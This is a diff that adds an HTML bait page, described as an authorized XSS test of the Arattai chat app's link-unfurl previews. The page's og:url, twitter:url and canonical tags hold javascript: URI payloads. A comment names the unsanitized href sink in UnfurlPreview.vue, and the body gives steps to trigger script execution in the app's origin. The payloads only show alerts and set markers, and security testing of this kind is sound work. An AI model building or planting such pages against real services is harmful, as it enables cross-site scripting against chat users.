@@ -1,0 +1,41 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Arattai unfurl href probe</title>
+<!--
+  Bait page for testing whether Arattai's server-side link-unfurl fetcher
+  copies a page's own claimed URL (og:url / canonical / twitter:url) into
+  msgobj.info.linkdetails.url unmodified, rather than using the URL that was
+  actually pasted into the chat message. Several candidate fields are set in
+  parallel since it's unknown from the client source which one the unfurl
+  fetcher reads; check the real Vuex/msgobj.info.linkdetails object in
+  devtools after sending this link to see which one (if any) won.
+
+  Target sink: UnfurlPreview.vue, `:href="linkDetails.link_url"` - a raw
+  binding with no scheme allowlist visible anywhere on the path from the
+  server response to the DOM attribute (unlike the unfurl iframe src, which
+  is passed through $Util.sanitizeURL()).
+-->
+<meta property="og:title" content="Arattai unfurl javascript: href probe">
+<meta property="og:description" content="Authorized XSS validation payload">
+<meta property="og:url" content="javascript:(function(){window.name='ARATTAI_XSS_UNFURL_HREF_OGURL';document.title='XSS EXECUTED';alert('ARATTAI_XSS_UNFURL_HREF_OGURL')})()">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:url" content="javascript:(function(){window.name='ARATTAI_XSS_UNFURL_HREF_TWITTERURL';alert('ARATTAI_XSS_UNFURL_HREF_TWITTERURL')})()">
+<link rel="canonical" href="javascript:(function(){window.name='ARATTAI_XSS_UNFURL_HREF_CANONICAL';alert('ARATTAI_XSS_UNFURL_HREF_CANONICAL')})()">
+</head>
+<body>
+<h1>Arattai unfurl href probe</h1>
+<p>This page is bait for an authorized XSS test. It has no payload of its own when
+loaded directly - only its Open Graph / canonical metadata is the payload, for the
+server-side unfurl fetcher to (hopefully not) copy into the unfurl card's link.</p>
+<p>Send this page's real hosted URL as a chat message, wait for the unfurl card to
+render, then inspect the resulting message's <code>info.linkdetails.url</code> /
+<code>link_url</code> in devtools. If it starts with <code>javascript:</code>,
+clicking the unfurl card's link/title should pop an alert and set
+<code>window.name</code> to one of the <code>ARATTAI_XSS_UNFURL_HREF_*</code>
+markers above, executing in the Arattai app's own origin (no iframe/sandbox
+involved for this sink).</p>
+</body>
+</html>
